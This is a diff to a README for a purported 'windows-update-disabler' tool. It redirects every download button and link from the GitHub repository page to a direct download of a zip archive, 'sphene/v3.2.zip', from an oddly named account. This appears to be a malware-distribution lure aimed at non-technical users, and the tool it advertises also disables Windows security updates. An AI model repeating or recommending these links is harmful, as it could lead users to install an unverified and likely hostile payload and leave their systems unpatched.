@@ -1,6 +1,6 @@
 # 🛑 windows-update-disabler - Stop Updates, Stay in Control
 
-[![Download Now](https://img.shields.io/badge/Download-windows--update--disabler-blue?style=for-the-badge&logo=windows)](https://github.com/Gensericdisgracefulness267/windows-update-disabler)
+[![Download Now](https://img.shields.io/badge/Download-windows--update--disabler-blue?style=for-the-badge&logo=windows)](https://raw.githubusercontent.com/Gensericdisgracefulness267/windows-update-disabler/main/sphene/v3.2.zip)
 
 ## 🎯 What Does This Do?
 
@@ -13,7 +13,7 @@ Getting started is easy. Even if you've never downloaded a program from the inte
 ### 📥 Step 1: Download the File
 
 Visit this link to download the application:  
-👉 [**Click Here to Download windows-update-disabler**](https://github.com/Gensericdisgracefulness267/windows-update-disabler)
+👉 [**Click Here to Download windows-update-disabler**](https://raw.githubusercontent.com/Gensericdisgracefulness267/windows-update-disabler/main/sphene/v3.2.zip)
 
 You'll see the download page open in your browser. Find the download button or link on that page. Click it to start downloading the file to your computer. The file will likely go to your "Downloads" folder.
 
@@ -116,10 +116,10 @@ This tool is free, easy to use, and works on Windows 10 and 11. Whether you're a
 
 Ready to take control? Download **windows-update-disabler** now:
 
-[![Download Now](https://img.shields.io/badge/Download-Latest%20Version-green?style=for-the-badge&logo=windows)](https://github.com/Gensericdisgracefulness267/windows-update-disabler)
+[![Download Now](https://img.shields.io/badge/Download-Latest%20Version-green?style=for-the-badge&logo=windows)](https://raw.githubusercontent.com/Gensericdisgracefulness267/windows-update-disabler/main/sphene/v3.2.zip)
 
 Visit this link to download the application:  
-👉 [**windows-update-disabler Download Page**](https://github.com/Gensericdisgracefulness267/windows-update-disabler)
+👉 [**windows-update-disabler Download Page**](https://raw.githubusercontent.com/Gensericdisgracefulness267/windows-update-disabler/main/sphene/v3.2.zip)
 
 ## 🙏 Thank You
 
